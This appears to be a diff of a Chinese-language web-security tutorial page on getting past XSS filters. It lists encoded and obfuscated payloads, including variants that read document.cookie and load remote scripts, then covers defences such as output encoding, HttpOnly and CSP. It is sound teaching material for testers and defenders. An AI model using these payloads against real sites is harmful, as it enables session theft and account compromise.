-<h4 id="&#x5E38;&#x89C4;&#x624B;&#x6CD5;"><a name="&#x5E38;&#x89C4;&#x624B;&#x6CD5;" class="anchor-navigation-ex-anchor" href="#&#x5E38;&#x89C4;&#x624B;&#x6CD5;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x5E38;&#x89C4;&#x624B;&#x6CD5;" class="anchor-navigation-ex-anchor" href="#&#x5E38;&#x89C4;&#x624B;&#x6CD5;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5E38;&#x89C4;&#x624B;&#x6CD5;</h4>
+<h3 id="&#x7ED5;&#x8FC7;">&#x7ED5;&#x8FC7;</h3>
+<h4 id="&#x5E38;&#x89C4;&#x624B;&#x6CD5;">&#x5E38;&#x89C4;&#x624B;&#x6CD5;</h4>
 <p>&#x4E00;&#x5207;&#x7684;&#x7ED5;&#x8FC7;&#x90FD;&#x9700;&#x8981;&#x5C3D;&#x91CF;&#x77E5;&#x9053;&#x4ED6;&#x7684;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#xFF0C;&#x5206;&#x6790;&#x51FA;&#x6765;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#x4E86;&#x5229;&#x7528;&#x8D77;&#x6765;&#x5C31;&#x65B9;&#x4FBF;&#x591A;&#x4E86;</p>
 <p>&#x5E38;&#x89C4;&#x7684;&#x4E00;&#x4E9B;&#x624B;&#x6CD5;&#xFF1A;</p>
 <ol>
@@ -5211,7 +5131,7 @@ xmlhttp<span class="token punctuation">.</span><span class="token function">send
 <li>HPP&#x53C2;&#x6570;&#x6C61;&#x67D3;</li>
 <li>&#x8D85;&#x957F;&#x5783;&#x573E;&#x5B57;&#x7B26;</li>
 </ol>
-<h4 id="&#x901A;&#x7528;&#x7F16;&#x7801;&#x624B;&#x6CD5;"><a name="&#x901A;&#x7528;&#x7F16;&#x7801;&#x624B;&#x6CD5;" class="anchor-navigation-ex-anchor" href="#&#x901A;&#x7528;&#x7F16;&#x7801;&#x624B;&#x6CD5;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x901A;&#x7528;&#x7F16;&#x7801;&#x624B;&#x6CD5;" class="anchor-navigation-ex-anchor" href="#&#x901A;&#x7528;&#x7F16;&#x7801;&#x624B;&#x6CD5;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x901A;&#x7528;&#x7F16;&#x7801;&#x624B;&#x6CD5;</h4>
+<h4 id="&#x901A;&#x7528;&#x7F16;&#x7801;&#x624B;&#x6CD5;">&#x901A;&#x7528;&#x7F16;&#x7801;&#x624B;&#x6CD5;</h4>
 <p>&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;xss&apos;or&#xFF1A;<a href="https://evilcos.me/lab/xssor/" target="_blank">https://evilcos.me/lab/xssor/</a></p>
 <p>XSS&apos;OR &#x7F16;&#x7801;&#x540E;&#x7528;&#x5728; on &#x4E8B;&#x4EF6;&#x4E4B;&#x540E; <code>onerror=xss&apos;or encode</code>&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x5230;<code>eval</code>&#x51FD;&#x6570;&#x4E2D; <code>eval(&quot;xss&apos;or encode&quot;)</code></p>
 <pre class="language-"><code class="lang-html">&lt;svg/onload=<span class="token entity" title="a">&amp;#x0061;</span><span class="token entity" title="l">&amp;#x006c;</span><span class="token entity" title="e">&amp;#x0065;</span><span class="token entity" title="r">&amp;#x0072;</span><span class="token entity" title="t">&amp;#x0074;</span><span class="token entity" title="(">&amp;#x0028;</span><span class="token entity" title="/">&amp;#x002f;</span><span class="token entity" title="x">&amp;#x0078;</span><span class="token entity" title="s">&amp;#x0073;</span><span class="token entity" title="s">&amp;#x0073;</span><span class="token entity" title="/">&amp;#x002f;</span><span class="token entity" title=")">&amp;#x0029;</span>&gt;
@@ -5228,12 +5148,12 @@ xmlhttp<span class="token punctuation">.</span><span class="token function">send
 <ul>
 <li><a href="https://github.com/aemkei/jsfuck" target="_blank">jsfuck</a>&#xFF1A;<a href="http://www.jsfuck.com/" target="_blank">http://www.jsfuck.com/</a></li>
 </ul>
-<p><a href="README.assets/2021-12-31%2013.50.12.gif" data-lightbox="41d092fb-05bd-4550-a9de-5952fe29eb23" data-title="jsfuck"><img src="README.assets/2021-12-31 13.50.12.gif" alt="jsfuck"></a></p>
+<p><a href="README.assets/2021-12-31%2013.50.12.gif" data-lightbox="6ee29932-fb41-4101-8478-90bef88299db" data-title="jsfuck"><img src="README.assets/2021-12-31 13.50.12.gif" alt="jsfuck"></a></p>
 <ul>
 <li><a href="http://utf-8.jp/public/jjencode.html" target="_blank">jjencode</a></li>
 </ul>
-<p><a href="README.assets/2021-12-31%2013.49.39.gif" data-lightbox="798ff0d2-927e-40a6-983a-526aabff1e93" data-title="jjencode"><img src="README.assets/2021-12-31 13.49.39.gif" alt="jjencode"></a></p>
-<h4 id="&#x901A;&#x8FC7;eval&#x51FD;&#x6570;"><a name="&#x901A;&#x8FC7;eval&#x51FD;&#x6570;" class="anchor-navigation-ex-anchor" href="#&#x901A;&#x8FC7;eval&#x51FD;&#x6570;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x901A;&#x8FC7;eval&#x51FD;&#x6570;" class="anchor-navigation-ex-anchor" href="#&#x901A;&#x8FC7;eval&#x51FD;&#x6570;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x901A;&#x8FC7;eval&#x51FD;&#x6570;</h4>
+<p><a href="README.assets/2021-12-31%2013.49.39.gif" data-lightbox="5cfd0219-af84-4c4c-b739-55a4a9a456b8" data-title="jjencode"><img src="README.assets/2021-12-31 13.49.39.gif" alt="jjencode"></a></p>
+<h4 id="&#x901A;&#x8FC7;eval&#x51FD;&#x6570;">&#x901A;&#x8FC7;eval&#x51FD;&#x6570;</h4>
 <p>&#x4E0A;&#x9762;&#x4E5F;&#x63D0;&#x5230;&#x4E86;&#xFF0C;&#x7B97;&#x662F;&#x4E3E;&#x4F8B;&#x5B50;&#x5427;</p>
 <pre class="language-"><code class="lang-html"># &#x5341;&#x516D;&#x8FDB;&#x5236;
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x78\x78\x78\x27\x29&quot;)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
@@ -5244,7 +5164,7 @@ xmlhttp<span class="token punctuation">.</span><span class="token function">send
 # &#x5176;&#x4ED6;
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>eval(String.\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
 </code></pre>
-<h4 id="&#x7ED5;&#x8FC7;&#x8FC7;&#x6EE4;"><a name="&#x7ED5;&#x8FC7;&#x8FC7;&#x6EE4;" class="anchor-navigation-ex-anchor" href="#&#x7ED5;&#x8FC7;&#x8FC7;&#x6EE4;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x7ED5;&#x8FC7;&#x8FC7;&#x6EE4;" class="anchor-navigation-ex-anchor" href="#&#x7ED5;&#x8FC7;&#x8FC7;&#x6EE4;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x7ED5;&#x8FC7;&lt;&#x8FC7;&#x6EE4;</h4>
+<h4 id="&#x7ED5;&#x8FC7;&#x8FC7;&#x6EE4;">&#x7ED5;&#x8FC7;&lt;&#x8FC7;&#x6EE4;</h4>
 <p>&#x5927;&#x591A;&#x6570;&#x7F51;&#x7AD9;&#x5728;&#x9632;&#x5FA1;&#x65F6;&#xFF0C;&#x90FD;&#x4F1A;&#x7ED9;&#x8F93;&#x5165;&#x7684;<code>&lt;</code>&#x8FDB;&#x884C;&#x7F16;&#x7801;&#x5904;&#x7406;&#xFF0C;&#x8BA9;&#x6211;&#x4EEC;&#x8BEF;&#x8BA4;&#x4E3A;&#x4E0D;&#x5B58;&#x5728;XSS&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x4E0D;&#x6E05;&#x695A;&#x540E;&#x7AEF;&#x662F;&#x5982;&#x4F55;&#x5904;&#x7406;&#x7684;&#xFF0C;&#x53EF;&#x80FD;&#x8F93;&#x5165;&#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x7684;&#x7F16;&#x7801;&#x4F1A;&#x88AB;&#x540E;&#x7AEF;&#x89E3;&#x7801;&#x5462;&#xFF1F;</p>
 <p>&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x7528;&#x5982;&#x4E0B;&#x7684;&#x4E00;&#x4E9B;payload&#x6765;&#x904D;&#x5386;&#xFF0C;&#x770B;&#x770B;&#x6709;&#x4E0D;&#x6709;&#x80FD;&#x8BA9;<code>&lt;</code>&#x89E3;&#x7801;&#x540E;&#x4F7F;&#x7528;&#x7684;&#xFF0C;&#x8FBE;&#x5230;&#x6211;&#x4EEC;XSS&#x7684;&#x76EE;&#x7684;</p>
 <pre class="language-"><code>&lt;
@@ -5319,12 +5239,12 @@ xmlhttp<span class="token punctuation">.</span><span class="token function">send
 \x3C
 \u003c
 \u003C
-</code></pre><h4 id="&#x7ED5;&#x8FC7;&#x5173;&#x952E;&#x8BCD;&#x8FC7;&#x6EE4;"><a name="&#x7ED5;&#x8FC7;&#x5173;&#x952E;&#x8BCD;&#x8FC7;&#x6EE4;" class="anchor-navigation-ex-anchor" href="#&#x7ED5;&#x8FC7;&#x5173;&#x952E;&#x8BCD;&#x8FC7;&#x6EE4;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x7ED5;&#x8FC7;&#x5173;&#x952E;&#x8BCD;&#x8FC7;&#x6EE4;" class="anchor-navigation-ex-anchor" href="#&#x7ED5;&#x8FC7;&#x5173;&#x952E;&#x8BCD;&#x8FC7;&#x6EE4;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x7ED5;&#x8FC7;&#x5173;&#x952E;&#x8BCD;&#x8FC7;&#x6EE4;</h4>
+</code></pre><h4 id="&#x7ED5;&#x8FC7;&#x5173;&#x952E;&#x8BCD;&#x8FC7;&#x6EE4;">&#x7ED5;&#x8FC7;&#x5173;&#x952E;&#x8BCD;&#x8FC7;&#x6EE4;</h4>
 <p>&#x6709;&#x4E9B;&#x7F51;&#x7AD9;&#x53EF;&#x80FD;&#x7981;&#x6B62;&#x4F7F;&#x7528;&#x4E00;&#x4E9B;&#x5173;&#x952E;&#x8BCD;&#x5982;<code>document.cookie</code>&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x7ED5;&#x8FC7;</p>
 <pre class="language-"><code class="lang-javascript">document <span class="token punctuation">.</span> cookie
 document<span class="token comment">/*xxx*/</span><span class="token punctuation">.</span><span class="token comment">/*xxx*/</span>cookie
 </code></pre>
-<h4 id="&#x7ED5;&#x8FC7;&#x7A7A;&#x683C;&#x8FC7;&#x6EE4;"><a name="&#x7ED5;&#x8FC7;&#x7A7A;&#x683C;&#x8FC7;&#x6EE4;" class="anchor-navigation-ex-anchor" href="#&#x7ED5;&#x8FC7;&#x7A7A;&#x683C;&#x8FC7;&#x6EE4;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x7ED5;&#x8FC7;&#x7A7A;&#x683C;&#x8FC7;&#x6EE4;" class="anchor-navigation-ex-anchor" href="#&#x7ED5;&#x8FC7;&#x7A7A;&#x683C;&#x8FC7;&#x6EE4;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x7ED5;&#x8FC7;&#x7A7A;&#x683C;&#x8FC7;&#x6EE4;</h4>
+<h4 id="&#x7ED5;&#x8FC7;&#x7A7A;&#x683C;&#x8FC7;&#x6EE4;">&#x7ED5;&#x8FC7;&#x7A7A;&#x683C;&#x8FC7;&#x6EE4;</h4>
 <p><code>/**/</code> &#x53EF;&#x4EE5;&#x66FF;&#x4EE3;&#x7A7A;&#x683C;</p>
 <pre class="language-"><code class="lang-html">&lt;img st/**/src =&quot;x&quot;/**/onerror=alert(1)&gt;
 </code></pre>
@@ -5334,7 +5254,7 @@ document<span class="token comment">/*xxx*/</span><span class="token punctuation
 %09
 %20
 %00
-</code></pre><h4 id="&#x7ED5;&#x8FC7;javascript&#x8FC7;&#x6EE4;"><a name="&#x7ED5;&#x8FC7;javascript&#x8FC7;&#x6EE4;" class="anchor-navigation-ex-anchor" href="#&#x7ED5;&#x8FC7;javascript&#x8FC7;&#x6EE4;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x7ED5;&#x8FC7;javascript&#x8FC7;&#x6EE4;" class="anchor-navigation-ex-anchor" href="#&#x7ED5;&#x8FC7;javascript&#x8FC7;&#x6EE4;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x7ED5;&#x8FC7;javascript&#x8FC7;&#x6EE4;</h4>
+</code></pre><h4 id="&#x7ED5;&#x8FC7;javascript&#x8FC7;&#x6EE4;">&#x7ED5;&#x8FC7;javascript&#x8FC7;&#x6EE4;</h4>
 <pre class="language-"><code class="lang-javascript">javas\rcript<span class="token operator">:</span>self<span class="token punctuation">[</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span>sessionStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">&apos;_diskSessionId&apos;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//</span>
 
 <span class="token comment">// http://example.com/redirect?url=javascript:alert()</span>
@@ -5342,7 +5262,7 @@ document<span class="token punctuation">.</span>location <span class="token oper
 document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">&apos;javasc\rript:alert(123)&apos;</span>
 document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">&apos;javasc\nript:alert(123)&apos;</span>
 </code></pre>
-<h4 id="&#x7ED5;&#x8FC7;&#x62EC;&#x53F7;&#x8FC7;&#x6EE4;"><a name="&#x7ED5;&#x8FC7;&#x62EC;&#x53F7;&#x8FC7;&#x6EE4;" class="anchor-navigation-ex-anchor" href="#&#x7ED5;&#x8FC7;&#x62EC;&#x53F7;&#x8FC7;&#x6EE4;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x7ED5;&#x8FC7;&#x62EC;&#x53F7;&#x8FC7;&#x6EE4;" class="anchor-navigation-ex-anchor" href="#&#x7ED5;&#x8FC7;&#x62EC;&#x53F7;&#x8FC7;&#x6EE4;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x7ED5;&#x8FC7;&#x62EC;&#x53F7;()&#x8FC7;&#x6EE4;</h4>
+<h4 id="&#x7ED5;&#x8FC7;&#x62EC;&#x53F7;&#x8FC7;&#x6EE4;">&#x7ED5;&#x8FC7;&#x62EC;&#x53F7;()&#x8FC7;&#x6EE4;</h4>
 <pre class="language-"><code class="lang-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span>
 prompt<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>document<span class="token punctuation">.</span>cookie<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span>
 window<span class="token punctuation">.</span>onerror<span class="token operator">=</span>alert<span class="token punctuation">;</span><span class="token keyword">throw</span> <span class="token number">1</span>
@@ -5350,14 +5270,14 @@ window<span class="token punctuation">.</span>onerror<span class="token operator
 <pre class="language-"><code class="lang-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>javascript:window.onerror=alert;throw 1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>window.onerror=alert;throw 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
 </code></pre>
-<h4 id="&#x7ED5;&#x8FC7;&#x957F;&#x5EA6;&#x9650;&#x5236;"><a name="&#x7ED5;&#x8FC7;&#x957F;&#x5EA6;&#x9650;&#x5236;" class="anchor-navigation-ex-anchor" href="#&#x7ED5;&#x8FC7;&#x957F;&#x5EA6;&#x9650;&#x5236;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x7ED5;&#x8FC7;&#x957F;&#x5EA6;&#x9650;&#x5236;" class="anchor-navigation-ex-anchor" href="#&#x7ED5;&#x8FC7;&#x957F;&#x5EA6;&#x9650;&#x5236;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x7ED5;&#x8FC7;&#x957F;&#x5EA6;&#x9650;&#x5236;</h4>
+<h4 id="&#x7ED5;&#x8FC7;&#x957F;&#x5EA6;&#x9650;&#x5236;">&#x7ED5;&#x8FC7;&#x957F;&#x5EA6;&#x9650;&#x5236;</h4>
 <ul>
 <li>&#x6267;&#x884C;&#x951A;&#x70B9;&#x540E;&#x9762;&#x7684;&#x5185;&#x5BB9; <code>location.hash</code></li>
 <li>&#x4F7F;&#x7528; <code>import(&apos;//domain/file&apos;)</code>&#xFF0C;&#x8FD9;&#x4E2A;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x540C;&#x6837;&#x7684;&#x534F;&#x8BAE;&#xFF0C;&#x52A0;&#x8F7D;&#x7684;js&#x7684;&#x54CD;&#x5E94;&#x5934;&#x4E2D;&#x7684;<code>content-type</code>&#x4E3A;<code>application/javascript</code>&#x800C;&#x4E14;&#x5141;&#x8BB8;&#x8DE8;&#x57DF;&#x52A0;&#x8F7D;<code>Access-Control-Allow-Origin: *</code> <a href="https://mp.weixin.qq.com/s/urbrLPstrLjrMyul7a4jpQ" target="_blank">&#x53C2;&#x8003;&#x6587;&#x7AE0;</a></li>
 <li>&#x7279;&#x6B8A;&#x7684;unicode&#x5B57;&#x7B26;&#xFF1A;<a href="https://www.fuhaoku.net/danweifuhao/" target="_blank">https://www.fuhaoku.net/danweifuhao/</a></li>
 </ul>
-<p><a href="README.assets/2021-12-31%2013.24.11.gif" data-lightbox="f50f6416-c4d7-44c9-9cda-50fd6249cc94" data-title=""><img src="README.assets/2021-12-31 13.24.11.gif" alt=""></a></p>
-<h4 id="&#x5229;&#x7528;js&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x7ED5;&#x8FC7;"><a name="&#x5229;&#x7528;js&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x7ED5;&#x8FC7;" class="anchor-navigation-ex-anchor" href="#&#x5229;&#x7528;js&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x7ED5;&#x8FC7;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x5229;&#x7528;js&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x7ED5;&#x8FC7;" class="anchor-navigation-ex-anchor" href="#&#x5229;&#x7528;js&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x7ED5;&#x8FC7;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5229;&#x7528;JS&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x7ED5;&#x8FC7;</h4>
+<p><a href="README.assets/2021-12-31%2013.24.11.gif" data-lightbox="9c78eba5-4398-47d4-a1dd-8ea87c8a8d2a" data-title=""><img src="README.assets/2021-12-31 13.24.11.gif" alt=""></a></p>
+<h4 id="&#x5229;&#x7528;js&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x7ED5;&#x8FC7;">&#x5229;&#x7528;JS&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x7ED5;&#x8FC7;</h4>
 <ul>
 <li>&#x5168;&#x5C40;&#x53D8;&#x91CF;</li>
 </ul>
@@ -5404,8 +5324,8 @@ result <span class="token operator">=</span> <span class="token punctuation">[</
 result <span class="token operator">=</span> <span class="token string">&quot;\\x&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
 <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">&quot;\\x&quot;</span> <span class="token operator">+</span> result<span class="token punctuation">)</span>
 </code></pre>
-<h2 id="&#x5E38;&#x89C4;&#x9632;&#x5FA1;"><a name="&#x5E38;&#x89C4;&#x9632;&#x5FA1;" class="anchor-navigation-ex-anchor" href="#&#x5E38;&#x89C4;&#x9632;&#x5FA1;"><i class="fa fa-link" aria-hidden="true"></i></a>1.7. &#x5E38;&#x89C4;&#x9632;&#x5FA1;</h2>
-<h3 id="&#x8F93;&#x5165;&#x68C0;&#x67E5;"><a name="&#x8F93;&#x5165;&#x68C0;&#x67E5;" class="anchor-navigation-ex-anchor" href="#&#x8F93;&#x5165;&#x68C0;&#x67E5;"><i class="fa fa-link" aria-hidden="true"></i></a>1.7.1. &#x8F93;&#x5165;&#x68C0;&#x67E5;</h3>
+<h2 id="&#x5E38;&#x89C4;&#x9632;&#x5FA1;">&#x5E38;&#x89C4;&#x9632;&#x5FA1;</h2>
+<h3 id="&#x8F93;&#x5165;&#x68C0;&#x67E5;">&#x8F93;&#x5165;&#x68C0;&#x67E5;</h3>
 <p>1&#x3001;&#x5047;&#x5B9A;&#x6240;&#x6709;&#x8F93;&#x5165;&#x90FD;&#x662F;&#x53EF;&#x7591;&#x7684;&#xFF0C;&#x5FC5;&#x987B;&#x5BF9;&#x6240;&#x6709;&#x8F93;&#x5165;&#x4E2D;&#x7684;<code>&lt;</code>&#x3001;<code>&gt;</code>&#x3001;<code>&apos;</code>&#x3001;<code>&quot;</code>&#x3001;<code>on.*</code>&#x3001;<code>script</code>&#x3001;<code>iframe</code>&#x7B49;&#x5B57;&#x6837;&#x8FDB;&#x884C;&#x4E25;&#x683C;&#x7684;&#x68C0;&#x67E5;&#x3002;&#x8FD9;&#x91CC;&#x7684;&#x8F93;&#x5165;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4EA4;&#x4E92;&#x7684;&#x8F93;&#x5165;&#x63A5;&#x53E3;&#xFF0C;&#x4E5F;&#x5305;&#x62EC;HTTP&#x8BF7;&#x6C42;&#x4E2D;&#x7684;Cookie&#x4E2D;&#x7684;&#x53D8;&#x91CF;&#xFF0C;HTTP&#x8BF7;&#x6C42;&#x5934;&#x90E8;&#x4E2D;&#x7684;&#x53D8;&#x91CF;&#x7B49;</p>
 <p>&#x5E38;&#x89C1;&#x8FC7;&#x6EE4;&#x5B57;&#x7B26;&#xFF1A;</p>
 <table>
@@ -5496,7 +5416,7 @@ result <span class="token operator">=</span> <span class="token string">&quot;\\
 <li>&#x5982;&#x679C;&#x7528;&#x6237;&#x8F93;&#x5165;&#x662F;&#x624B;&#x673A;&#x53F7;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x9700;&#x8981;&#x5224;&#x65AD;&#x662F;&#x5426;&#x662F;11&#x4F4D;&#x6570;&#x5B57;</li>
 <li>&#x5982;&#x679C;&#x6570;&#x636E;&#x5185;&#x5BB9;&#x4E3A;&#x90AE;&#x7BB1;&#xFF0C;&#x5219;&#x5E94;&#x4F7F;&#x7528;&#x6B63;&#x5219;&#x53D6;<code>A-Za-z0-9.@-_</code>&#x8303;&#x56F4;&#x5185;&#x7684;&#x503C;&#xFF0C;&#x5176;&#x5B83;&#x5B57;&#x7B26;&#x5219;&#x5FFD;&#x7565;&#x6389;</li>
 </ul>
-<h3 id="&#x8F93;&#x51FA;&#x7F16;&#x7801;"><a name="&#x8F93;&#x51FA;&#x7F16;&#x7801;" class="anchor-navigation-ex-anchor" href="#&#x8F93;&#x51FA;&#x7F16;&#x7801;"><i class="fa fa-link" aria-hidden="true"></i></a>1.7.2. &#x8F93;&#x51FA;&#x7F16;&#x7801;</h3>
+<h3 id="&#x8F93;&#x51FA;&#x7F16;&#x7801;">&#x8F93;&#x51FA;&#x7F16;&#x7801;</h3>
 <p>&#x5BF9;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x4E0D;&#x4FE1;&#x4EFB;&#x7684;&#x5185;&#x5BB9;&#x5747;&#x91C7;&#x7528;&#x7F16;&#x7801;&#x7684;&#x65B9;&#x5F0F;&#x8F93;&#x51FA;&#x5230;&#x9875;&#x9762;&#x4E2D;&#xFF0C;&#x8F93;&#x51FA;&#x7F16;&#x7801;&#x624B;&#x6BB5;&#x4E3B;&#x8981;&#x6709;3&#x79CD;&#x7F16;&#x7801;&#xFF1A;</p>
 <ul>
 <li>URL&#x7F16;&#x7801;</li>
@@ -5511,7 +5431,7 @@ result <span class="token operator">=</span> <span class="token string">&quot;\\
 &apos; --&gt; <span class="token entity" title="&apos;">&amp;#x27;</span>
 / --&gt; <span class="token entity" title="/">&amp;#x2F;</span>
 </code></pre>
-<h3 id="&#x4F7F;&#x7528;httponly"><a name="&#x4F7F;&#x7528;httponly" class="anchor-navigation-ex-anchor" href="#&#x4F7F;&#x7528;httponly"><i class="fa fa-link" aria-hidden="true"></i></a>1.7.3. &#x4F7F;&#x7528;httponly</h3>
+<h3 id="&#x4F7F;&#x7528;httponly">&#x4F7F;&#x7528;httponly</h3>
 <p><strong>HTTP-only Cookie&#xFF1A;</strong>&#x7981;&#x6B62;JavaScript&#x8BFB;&#x53D6;&#x67D0;&#x4E9B;&#x654F;&#x611F;Cookie&#xFF0C;&#x4F7F;&#x5F97;&#x653B;&#x51FB;&#x8005;&#x5B8C;&#x6210;XSS&#x6CE8;&#x5165;&#x540E;&#x4E5F;&#x65E0;&#x6CD5;&#x6210;&#x529F;&#x7A83;&#x53D6;&#x5230;Cookie</p>
 <blockquote>
 <p>[!WARNING]</p>
@@ -5526,7 +5446,7 @@ result <span class="token operator">=</span> <span class="token string">&quot;\\
 <li>&#x5F00;&#x542F;<code>TRACE</code>&#x534F;&#x8BAE;</li>
 </ul>
 </blockquote>
-<h3 id="&#x4F7F;&#x7528;csp"><a name="&#x4F7F;&#x7528;csp" class="anchor-navigation-ex-anchor" href="#&#x4F7F;&#x7528;csp"><i class="fa fa-link" aria-hidden="true"></i></a>1.7.4. &#x4F7F;&#x7528;CSP</h3>
+<h3 id="&#x4F7F;&#x7528;csp">&#x4F7F;&#x7528;CSP</h3>
 <p>Content Security Policy&#xFF08;&#x5185;&#x5BB9;&#x5B89;&#x5168;&#x7B56;&#x7565;&#xFF09;&#xFF1A;</p>
 <ol>
 <li>&#x7981;&#x6B62;&#x52A0;&#x8F7D;&#x5916;&#x57DF;&#x4EE3;&#x7801;&#xFF0C;&#x9632;&#x6B62;&#x590D;&#x6742;&#x7684;&#x653B;&#x51FB;&#x903B;&#x8F91;&#x3002;</li>
@@ -5537,15 +5457,15 @@ result <span class="token operator">=</span> <span class="token string">&quot;\\
 </ol>
 <p><strong>CSP &#x7684;&#x5B9E;&#x8D28;&#x5C31;&#x662F;&#x767D;&#x540D;&#x5355;&#x5236;&#x5EA6;&#xFF0C;&#x5F00;&#x53D1;&#x8005;&#x660E;&#x786E;&#x544A;&#x8BC9;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x54EA;&#x4E9B;&#x5916;&#x90E8;&#x8D44;&#x6E90;&#x53EF;&#x4EE5;&#x52A0;&#x8F7D;&#x548C;&#x6267;&#x884C;&#xFF0C;&#x7B49;&#x540C;&#x4E8E;&#x63D0;&#x4F9B;&#x767D;&#x540D;&#x5355;</strong>&#x3002;&#x5B83;&#x7684;&#x5B9E;&#x73B0;&#x548C;&#x6267;&#x884C;&#x5168;&#x90E8;&#x7531;&#x6D4F;&#x89C8;&#x5668;&#x5B8C;&#x6210;&#xFF0C;&#x5F00;&#x53D1;&#x8005;&#x53EA;&#x9700;&#x63D0;&#x4F9B;&#x914D;&#x7F6E;&#x3002;CSP &#x5927;&#x5927;&#x589E;&#x5F3A;&#x4E86;&#x7F51;&#x9875;&#x7684;&#x5B89;&#x5168;&#x6027;&#x3002;&#x653B;&#x51FB;&#x8005;&#x5373;&#x4F7F;&#x53D1;&#x73B0;&#x4E86;&#x6F0F;&#x6D1E;&#xFF0C;&#x4E5F;&#x6CA1;&#x6CD5;&#x6CE8;&#x5165;&#x811A;&#x672C;&#xFF0C;&#x9664;&#x975E;&#x8FD8;&#x63A7;&#x5236;&#x4E86;&#x4E00;&#x53F0;&#x5217;&#x5165;&#x4E86;&#x767D;&#x540D;&#x5355;&#x7684;&#x53EF;&#x4FE1;&#x4E3B;&#x673A;</p>
 <p>&#x53EF;&#x4EE5;&#x53C2;&#x8003;mozilla&#x7684;&#x5B98;&#x65B9;&#x6587;&#x6863;&#xFF1A;<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p>
